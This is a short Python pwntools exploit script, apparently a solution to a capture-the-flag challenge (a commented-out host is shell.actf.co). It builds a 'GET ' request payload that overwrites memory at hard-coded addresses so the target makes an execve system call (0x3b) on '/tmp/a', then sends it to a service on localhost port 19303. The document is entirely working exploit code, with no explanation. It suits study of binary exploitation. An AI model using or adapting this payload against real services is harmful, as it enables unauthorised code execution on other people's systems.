#!/usr/bin/env python

from pwn import *
import time


addr_buf = 0x402010

addr_rdi = 0x402810
addr_rsi = 0x402820
addr_rdx = 0x402878

buf = "GET "
buf += "\x00" * 0x100
buf += "/tmp/a\x00"
buf += "\x00" * (addr_rdi - addr_buf - 0x100 - 7)
buf += p64(addr_buf+0x100)
buf += p64(0xffffffffffffffbf)
buf += p64(0)
for i in xrange(20):
    buf += p64(0x3b)
buf += " "

p = remote('localhost', 19303)
#p = remote("shell.actf.co", 19303)
raw_input()
p.send(buf)
while True :
   time.sleep(1)
#p.interactive()
